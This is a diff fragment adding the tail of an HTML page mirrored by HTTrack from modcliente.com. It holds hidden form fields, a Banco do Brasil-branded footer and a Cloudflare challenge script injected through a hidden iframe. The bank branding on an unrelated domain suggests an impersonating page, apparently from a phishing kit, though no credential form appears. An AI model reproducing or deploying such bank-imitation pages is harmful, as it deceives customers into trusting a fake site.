">
+<input type="hidden" name="info" id="info" value=""><br>		
+<input type="hidden" name="versao" id="versao" value=""><br>		
+<input type="hidden" name="serverIP" id="serverIP" value=""><br>		
+<input type="hidden" name="serverID" id="serverID" value="pxl0seg00002_seg-443-06"><br>
+<!-- Campo que contem assinatura do método Info -->
+
+<footer>
+  <div class="container">
+      <div class="left">
+          <a class="left" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;">Segurança</a>
+          <span class="left">|</span>
+          <a class="left" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;">Política de Privacidade</a>
+          <span class="left">|</span>
+          <a class="left" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;">Relação com Investidores</a>
+          <span class="left">|</span>
+          <a class="left" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;">Imprensa</a>
+          <span class="left">|</span>
+          <a class="left" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;">O Banco do Brasil</a>
+      </div>
+      <div class="right">
+          <a class="right" href="#" target="_blank" style="font-family: 'Poppins', sans-serif;"><strong>@ Banco do Brasil</strong></a>
+      </div>
+  </div>
+</footer>
+
+<script type="text/javascript" src="js/jquery.min.html"></script>       	
+ <script type="text/javascript" src="js/nocache.html"></script>
+ <script type="text/javascript" src="js/faq.html"></script> 
+  <script>(function(){var js = "window['__CF$cv$params']={r:'7ea77a342e88d9f1'};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='cdn-cgi/challenge-platform/h/b/scripts/jsd/e6489737/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+
+<!-- Mirrored from modcliente.com/atendimento.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Jul 2023 00:13:32 GMT -->
+</html>
